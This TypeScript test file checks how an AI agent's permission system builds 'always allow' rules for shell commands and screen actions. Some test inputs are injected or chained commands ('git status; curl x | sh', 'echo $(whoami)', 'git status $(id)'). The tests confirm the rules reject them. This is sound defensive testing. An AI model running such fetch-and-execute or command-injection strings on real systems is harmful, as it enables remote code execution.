import { expect, test } from 'bun:test';
import invariant from 'tiny-invariant';
import { buildAlwaysAllowRule } from './build-always-allow-rule';
import { isRuleMatch } from './is-rule-match';

test.each([
  ['git status', 'git status *'],
  ['git status -s', 'git status *'],
  ['ls -la ~/files', 'ls *'],
  ['pwd', 'pwd *'],
])('it offers a pattern of the first words of %s', (command, pattern) => {
  const rule = buildAlwaysAllowRule({
    shortID: 'ab12cd34ef',
    tool: 'computer.run',
    input: { command, timeoutSeconds: 30 },
    destinations: [],
    content: ['command'],
  });

  expect(rule?.form.checks).toStrictEqual([{ arg: 'command', op: 'matches', value: pattern }]);
});

test.each(['git status; curl x | sh', 'echo $(whoami)', 'cat a > b', ''])(
  'it offers no rule for the command %p',
  (command) => {
    expect(
      buildAlwaysAllowRule({
        shortID: 'ab12cd34ef',
        tool: 'computer.run',
        input: { command },
        destinations: [],
        content: ['command'],
      }),
    ).toBeNull();
  },
);

test('it offers a rule that allows git status and refuses a chained command', () => {
  const rule = buildAlwaysAllowRule({
    shortID: 'ab12cd34ef',
    tool: 'computer.run',
    input: { command: 'git status -s' },
    destinations: [],
    content: ['command'],
  });

  invariant(rule !== null, 'a plain command gets a rule');

  const base = {
    tool: 'computer.run',
    effects: ['computer_run' as const],
    context: 'conversation' as const,
    task: null,
    destinations: [],
    sources: [],
    at: 0,
  };

  expect(isRuleMatch(rule.form, { ...base, args: { command: 'git status' } })).toBe(true);

  expect(isRuleMatch(rule.form, { ...base, args: { command: 'git status; curl x | sh' } })).toBe(
    false,
  );

  expect(isRuleMatch(rule.form, { ...base, args: { command: 'git status $(id)' } })).toBe(false);
});

function setupTest() {
  const base = {
    effects: ['send' as const],
    context: 'conversation' as const,
    task: null,
    sources: [],
    at: 0,
  };

  const click = { x: 412, y: 233, button: 'left' };

  const rule = buildAlwaysAllowRule({
    shortID: 'ab12cd34ef',
    tool: 'computer.screen_click',
    input: click,
    destinations: ['a.test'],
    content: [],
  });

  invariant(rule !== null, 'a screen act on a site gets a rule');

  return {
    rule,
    isCovered: (tool: string, args: Record<string, string | number>, host: string) =>
      isRuleMatch(rule.form, { ...base, tool, args, destinations: [host] }),
  };
}

test('it offers a screen act a rule that names the host alone, with no check', () => {
  const ctx = setupTest();

  expect(ctx.rule.form).toMatchObject({
    outcome: 'allow',
    tools: ['computer.screen_click', 'computer.screen_type'],
    destinations: ['a.test'],
  });

  expect(ctx.rule.form.checks).toBeUndefined();
});

test('it covers a screen click at other coordinates on the same host', () => {
  const ctx = setupTest();

  expect(ctx.isCovered('computer.screen_click', { x: 1, y: 2, button: 'right' }, 'a.test')).toBe(
    true,
  );
});

test('it covers a screen type on the same host', () => {
  const ctx = setupTest();

  expect(ctx.isCovered('computer.screen_type', { text: 'hello' }, 'a.test')).toBe(true);
});

test('it leaves a screen click on another host to ask', () => {
  const ctx = setupTest();

  expect(ctx.isCovered('computer.screen_click', { x: 412, y: 233, button: 'left' }, 'b.test')).toBe(
    false,
  );
});

test('it does not cover a browser click on the same host', () => {
  const ctx = setupTest();

  expect(ctx.isCovered('computer.browser_click', { tab: 't1', element: 'E1' }, 'a.test')).toBe(
    false,
  );
});

test('it offers a screen act on a window with no host no rule', () => {
  expect(
    buildAlwaysAllowRule({
      shortID: 'ab12cd34ef',
      tool: 'computer.screen_type',
      input: { text: 'hello' },
      destinations: [],
      content: [],
    }),
  ).toBeNull();
});

test('it offers no rule for a move of a topic, whose endpoints no check can pin', () => {
  const rule = buildAlwaysAllowRule({
    shortID: 'ab12cd34ef',
    tool: 'memory.retopic',
    input: {
      from: { topic: 'lines', subject: 'self' },
      to: { topic: 'diary', subject: 'self' },
    },
    destinations: [],
    content: ['from', 'to'],
  });

  expect(rule).toBeNull();
});
